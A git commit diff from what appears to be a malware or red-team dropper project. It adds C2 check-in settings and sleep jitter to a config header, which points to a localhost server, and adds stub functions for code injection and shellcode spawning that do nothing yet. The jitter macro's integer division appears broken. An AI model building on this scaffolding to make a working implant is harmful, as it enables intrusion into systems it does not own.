0d58d134d33f3a81eb4f9ba5073351161de153af
Rahul Arasikere <arasikere.rahul@gmail.com>
2021-12-09 00:37:02 -0500

    basic eval loop

--- dropper/config.h
+++ dropper/config.h
@@ -18,9 +18,13 @@
 #define MALWARE_KILL_DATE_YEAR 2022 
 #define MALWARE_NAMED_PIPE "ch0nky"
 
+#define MALWARE_SLEEP_MILLISECONDS_JITTER (DWORD)(2000 + rand()/(RAND_MAX + 1)  * (3000)) /*Random jitter between 2sec to 5seconds*/
+
 #define MALWARE_JSON_REQUEST_HEADER L"Content-Type: application/json\r\nUser-Agent: ch0nky\r\n"
 #define MALWARE_C2_SERVER_ADDRESS L"http://127.0.0.1"
 #define MALWARE_C2_SERVER_PORT 8080
 #define MALWARE_C2_SERVER_REGISTER_URI L"/register"
+#define MALWARE_C2_SERVER_CHECKIN_URI L"/checkin"
+#define MALWARE_C2_SERVER_USE_TLS false
 
 #endif
---
+++ dropper/loader.cpp
@@ -0,0 +1,6 @@
+#include "loader.h"
+#include "config.h"
+#include "httpClient.h"
+
+bool InjectExecutionCode(std::wstring buffer) { return false; };
+bool SpawnShellCode(std::wstring buffer) { return false; };
